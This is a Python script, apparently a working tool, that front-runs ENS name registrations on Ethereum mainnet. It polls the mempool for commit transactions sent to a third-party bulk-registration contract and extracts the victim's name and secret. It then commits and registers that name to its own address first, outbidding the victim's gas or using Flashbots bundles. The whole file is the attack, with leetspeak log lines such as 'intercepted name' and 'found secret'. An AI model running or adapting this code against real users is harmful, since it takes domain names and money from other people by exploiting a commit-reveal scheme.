# FRFR
import os
from web3 import Web3, HTTPProvider
import asyncio
import math
import json
from eth_account import Account
from eth_account.signers.local import LocalAccount
import time
import datetime
from flashbots import flashbot
import argparse


class NotRareEnough:
    def __init__(self, args):
        self.provider = "http://192.168.1.72:8545"
        self.w3 = Web3(HTTPProvider(self.provider))

        self.send_to = self.w3.toChecksumAddress("xxxxxxxxxxxx")
        self.on_addr = "0x582dEb82866032D31F47816a8d0225513E536C77" # real
        self.pkey = os.getenv("PKEY")
        self.ETH_ACCOUNT: LocalAccount = Account.from_key(self.pkey)

        self.on_abi = """[{"inputs":[{"internalType":"address","name":"_controler","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"string[]","name":"names","type":"string[]"},{"internalType":"bytes32","name":"secret","type":"bytes32"}],"name":"commit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getControllerAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string[]","name":"names","type":"string[]"},{"internalType":"uint256[]","name":"durations","type":"uint256[]"},{"internalType":"bool","name":"getAll","type":"bool"}],"name":"multiNamePrices","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string[]","name":"names","type":"string[]"},{"internalType":"uint256[]","name":"durations","type":"uint256[]"},{"internalType":"bytes32","name":"secret","type":"bytes32"}],"name":"register","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"string[]","name":"names","type":"string[]"},{"internalType":"uint256[]","name":"durations","type":"uint256[]"}],"name":"renew","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newControllerAddress","type":"address"}],"name":"updateControllerAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}]"""
        self.on_contract = self.w3.eth.contract(address=self.on_addr, abi=json.loads(self.on_abi))

        self.ens_registrar = self.w3.toChecksumAddress("0x283af0b28c62c092c9727f1ee09c02ca627eb7f5")
        self.ens_abi = """[{"inputs":[{"internalType":"contract BaseRegistrar","name":"_base","type":"address"},{"internalType":"contract PriceOracle","name":"_prices","type":"address"},{"internalType":"uint256","name":"_minCommitmentAge","type":"uint256"},{"internalType":"uint256","name":"_maxCommitmentAge","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"string","name":"name","type":"string"},{"indexed":true,"internalType":"bytes32","name":"label","type":"bytes32"},{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":false,"internalType":"uint256","name":"cost","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"expires","type":"uint256"}],"name":"NameRegistered","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"string","name":"name","type":"string"},{"indexed":true,"internalType":"bytes32","name":"label","type":"bytes32"},{"indexed":false,"internalType":"uint256","name":"cost","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"expires","type":"uint256"}],"name":"NameRenewed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"oracle","type":"address"}],"name":"NewPriceOracle","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"constant":true,"inputs":[],"name":"MIN_REGISTRATION_DURATION","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"string","name":"name","type":"string"}],"name":"available","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"bytes32","name":"commitment","type":"bytes32"}],"name":"commit","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"name":"commitments","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"isOwner","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"address","name":"owner","type":"address"},{"internalType":"bytes32","name":"secret","type":"bytes32"}],"name":"makeCommitment","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":true,"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"address","name":"owner","type":"address"},{"internalType":"bytes32","name":"secret","type":"bytes32"},{"internalType":"address","name":"resolver","type":"address"},{"internalType":"address","name":"addr","type":"address"}],"name":"makeCommitmentWithConfig","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":true,"inputs":[],"name":"maxCommitmentAge","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"minCommitmentAge","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"duration","type":"uint256"},{"internalType":"bytes32","name":"secret","type":"bytes32"}],"name":"register","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"duration","type":"uint256"},{"internalType":"bytes32","name":"secret","type":"bytes32"},{"internalType":"address","name":"resolver","type":"address"},{"internalType":"address","name":"addr","type":"address"}],"name":"registerWithConfig","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"uint256","name":"duration","type":"uint256"}],"name":"renew","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"uint256","name":"duration","type":"uint256"}],"name":"rentPrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"_minCommitmentAge","type":"uint256"},{"internalType":"uint256","name":"_maxCommitmentAge","type":"uint256"}],"name":"setCommitmentAges","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"contract PriceOracle","name":"_prices","type":"address"}],"name":"setPriceOracle","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceID","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"string","name":"name","type":"string"}],"name":"valid","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":false,"inputs":[],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]"""
        self.ENS = self.w3.eth.contract(address=self.ens_registrar, abi=self.ens_abi)
        self.duration = 2419200
        self.last_sent_block = 0

        flashbot(self.w3, self.ETH_ACCOUNT)
        self.flashbots = self.w3.flashbots

        self.use_flashbots = args.use_flashbots

        return

    def get_transactions(self):
        tx_filter = self.w3.eth.filter('pending')
        loop = asyncio.get_event_loop()
        try:
            loop.run_until_complete(
                asyncio.gather(
                    self.log_loop(tx_filter, 1)))
        finally:
            loop.close()

    # input is transaction list/map. decode the "input/data" param from contract.
    def handle_event(self, tx):
        #print(tx)
        params = self.on_contract.decode_function_input(tx["input"])
        onCommit = '0xc24e1672'
        if tx["input"][0:10] == onCommit:
            self.replay_commit(params[1], tx)


    async def log_loop(self, event_filter, poll_interval):
        while True:
            for event in self.w3.eth.get_filter_changes(event_filter.filter_id):
                try:
                    tx = self.w3.eth.get_transaction(event)
                    if tx['to'] == self.on_addr:
                        #print(tx)
                        self.handle_event(tx)

                except Exception as e:
                    #print(f"{self.w3.toHex(event)} tx not found")
                    continue

            await asyncio.sleep(poll_interval)

    def countdown(self, t):
        while t:
            mins, secs = divmod(t, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(f"[+] countdown {timer}", end="\r")
            time.sleep(1)
            t -= 1

    # require baseFee to be < 50
    def replay_commit(self, data, tx):
        print(f"[+] got silly commit data")
        #print(data)
        names = []
        secret = data['secret']

        for name in data['names']:

            if len(name) >= 5:
                print(f"[+] 1nt3rc3pt3d n4m3 : {name} from {tx['from']}")
                names.append(name)
                break

        print(f"[+] f0und s3cr3t: {self.w3.toHex(secret)}")

        commitment = self.ENS.functions.makeCommitment(names[0], self.send_to, secret).call()
        print("[+] c0mm1tm3nt : %s " % self.w3.toHex(commitment))

        nonce = self.w3.eth.getTransactionCount(self.ETH_ACCOUNT.address)
        tx_info = {
            'chainId': 1,
            'from': self.ETH_ACCOUNT.address,
            'to': self.ens_registrar,
            'nonce': nonce,
            'gas': tx['gas'],
            'maxFeePerGas': tx['maxFeePerGas'] * 2,
            'maxPriorityFeePerGas': tx['maxPriorityFeePerGas'] * 2,
            'data': self.ENS.encodeABI(fn_name="commit", args=[commitment])
        }

        #print(tx_info)
        ################################
        if self.use_flashbots:
            print("[+] sending flashbots..")
            bundle = self.build_bundle(tx_info)
            print(bundle)

            self.simulate(bundle)
            #return
            confirmed = None
            while not confirmed:
                confirmed = self.send_and_wait_flashbots(bundle)
        else:
            self.send_mainnet(tx_info)

        print("[+] tr4ns4ct1on m1n3d")
        print("[+] sl33py sl33p 60s")

        self.countdown(60)

        print("[+] s3nd r3g1st3r tx n0w.")
        print(f"[+] name: {names[0]}")
        priceWEI = self.ENS.functions.rentPrice(names[0], self.duration).call()
        price = math.floor(self.w3.toWei(priceWEI * 1.10, "wei"))

        print(f"[+] Price: {price}")
        base_fee = self.w3.eth.fee_history(1, 'latest')
        r_tx = {
            'chainId': 1,
            'from': self.ETH_ACCOUNT.address,
            'to': self.ens_registrar,
            'nonce': nonce + 1,
            'gas': 220000,
            'value': price,
            'maxFeePerGas': (math.floor(base_fee["baseFeePerGas"][1] * 1.10) + self.w3.toWei(2, "gwei")),
            'maxPriorityFeePerGas': tx['maxPriorityFeePerGas'] * 2,
            'data': self.ENS.encodeABI(fn_name="register", args=[names[0], self.send_to, self.duration, secret])
        }

        if self.use_flashbots:
            bundle = self.build_bundle(r_tx)
            self.simulate(bundle)
            confirmed = None
            while not confirmed:
                confirmed = self.send_and_wait_flashbots(bundle)

        else:
            self.send_mainnet(r_tx)

    def simulate(self, bundle):
        print("simulate...")
        print(bundle)
        success = False
        while not success:
            try:
                result = self.flashbots.simulate(bundle, block_tag=self.w3.eth.block_number)
                print(result)
                success = True

            except Exception as exception:
                print("simulate: %s" % exception)

    def build_bundle(self, tx):
        out = {
        "signer": self.ETH_ACCOUNT,
        "transaction": {
            "chainId": "",
            "maxFeePerGas": "",
            "maxPriorityFeePerGas": "",
            "gas": "",
            "to": "",
            "nonce": "",
            "data": "",
            #'value': tx['value'],
            },
        }
        out_tx = out
        out_tx["transaction"]["chainId"] = tx["chainId"]
        out_tx["transaction"]["maxFeePerGas"] = tx["maxFeePerGas"]
        out_tx["transaction"]["maxPriorityFeePerGas"] = tx["maxPriorityFeePerGas"]
        out_tx["transaction"]["gas"] = tx["gas"]
        out_tx["transaction"]["to"] = tx["to"]
        out_tx["transaction"]["nonce"] = tx["nonce"]
        out_tx["transaction"]["data"] = tx["data"]
        return [out_tx]

    def send_and_wait_flashbots(self, bundle):
        block_number = self.w3.eth.blockNumber

        if self.last_sent_block == block_number:
            return False
        print("sending...")
        b_time = datetime.datetime.fromtimestamp(time.time()).strftime("%m-%d-%Y %H:%M:%S")
        result = self.flashbots.send_bundle(bundle, target_block_number=block_number + 1)
        self.last_sent_block = block_number
        print(f"[+] Bundle broad casted at block:{block_number} - time:{b_time}\n")
        try:
            result.wait()
            receipts = result.receipts()
            #print(receipts)
            print(f"[+] Transaction confirmed at block {self.w3.eth.block_number} [flashbots]")
            return True
        except Exception as exception:
            return False

    def send_mainnet(self, tx):
        print("[+] s3nd1ng tx.")
        signed_tx = self.w3.eth.account.sign_transaction(tx, self.pkey)
        send_tx = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print("[+] tx hash %s " % self.w3.toHex(send_tx))
        print("[+] w41t1ng 0n tr4ns4ct1on t0 b3 m1n3d")
        self.w3.eth.wait_for_transaction_receipt(send_tx)
        print("[+] tx mined")

    def main(self):
        print("[+] FRFR ;PpPPPpPPPpPPP")
        self.get_transactions()
        return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="FRFR - lcfr.eth (08/2022)\n")
    parser.add_argument("--flashbots", dest="use_flashbots", type=bool,
                        help="enable flashbots relay.",
                        default=False)
    args = parser.parse_args()
    main = NotRareEnough(args)
